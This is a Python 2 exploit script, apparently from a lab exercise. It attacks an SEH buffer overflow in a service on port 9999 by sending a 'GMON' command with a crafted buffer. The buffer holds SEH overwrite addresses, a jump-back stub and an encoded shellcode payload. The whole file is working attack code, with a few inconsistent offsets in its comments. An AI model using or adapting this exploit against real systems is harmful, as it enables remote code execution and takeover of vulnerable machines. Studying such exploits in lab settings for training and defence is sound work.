#!/usr/bin/python 

import socket,sys

#source https://resources.infosecinstitute.com/seh-exploit/
address = "192.168.174.132"
port = 9999
offset = 3494
nseh = '\xeb\x0F\x90\x90' #JMP 16 and NOP NOP
#6250172B
seh = '\x2b\x17\x50\x62'
"""
Jump back trick
\x59			POP ECX
\xFE\xCD		DEC CH
\xFE\xCD		DEC CH
\xFE\xCD		DEC CH
\xFF\xE1		JMP ECX
\xE8\xF2\xFF\xFF\xFF	CALL [relative -0D]
"""
jump_back = "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF" #jump backwards by 768 bytes

#so we jump 768 bytes - then should substract 22 (seh, nseh and jump_back code) this means that
#shellcode should be located 746 from offset
#so offset - 746 = 3490 - 746 = 2744
before_sc = 2748 * '\x90'
nops_for_shellcode = '\x90' * 16
sc =  ""
sc += "\xba\xb6\x95\x9b\xae\xd9\xc3\xd9\x74\x24\xf4\x5b\x2b"
sc += "\xc9\xb1\x31\x83\xc3\x04\x31\x53\x0f\x03\x53\xb9\x77"
sc += "\x6e\x52\x2d\xf5\x91\xab\xad\x9a\x18\x4e\x9c\x9a\x7f"
sc += "\x1a\x8e\x2a\x0b\x4e\x22\xc0\x59\x7b\xb1\xa4\x75\x8c"
sc += "\x72\x02\xa0\xa3\x83\x3f\x90\xa2\x07\x42\xc5\x04\x36"
sc += "\x8d\x18\x44\x7f\xf0\xd1\x14\x28\x7e\x47\x89\x5d\xca"
sc += "\x54\x22\x2d\xda\xdc\xd7\xe5\xdd\xcd\x49\x7e\x84\xcd"
sc += "\x68\x53\xbc\x47\x73\xb0\xf9\x1e\x08\x02\x75\xa1\xd8"
sc += "\x5b\x76\x0e\x25\x54\x85\x4e\x61\x52\x76\x25\x9b\xa1"
sc += "\x0b\x3e\x58\xd8\xd7\xcb\x7b\x7a\x93\x6c\xa0\x7b\x70"
sc += "\xea\x23\x77\x3d\x78\x6b\x9b\xc0\xad\x07\xa7\x49\x50"
sc += "\xc8\x2e\x09\x77\xcc\x6b\xc9\x16\x55\xd1\xbc\x27\x85"
sc += "\xba\x61\x82\xcd\x56\x75\xbf\x8f\x3c\x88\x4d\xaa\x72"
sc += "\x8a\x4d\xb5\x22\xe3\x7c\x3e\xad\x74\x81\x95\x8a\x85"
sc += "\x70\x24\x06\x11\x2b\xdd\x6b\x7f\xcc\x0b\xaf\x86\x4f"
sc += "\xbe\x4f\x7d\x4f\xcb\x4a\x39\xd7\x27\x26\x52\xb2\x47"
sc += "\x95\x53\x97\x2b\x78\xc0\x7b\x82\x1f\x60\x19\xda"

after_shellcode = (3494 - len(before_sc + nops_for_shellcode + sc)) * '\x90'
print(len(after_shellcode))
buffer = before_sc + nops_for_shellcode + sc + after_shellcode + nseh + seh + jump_back
buffer += (4000 - len(buffer)) *'\x90'
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
        s.send('GMON /.:/ ' + buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
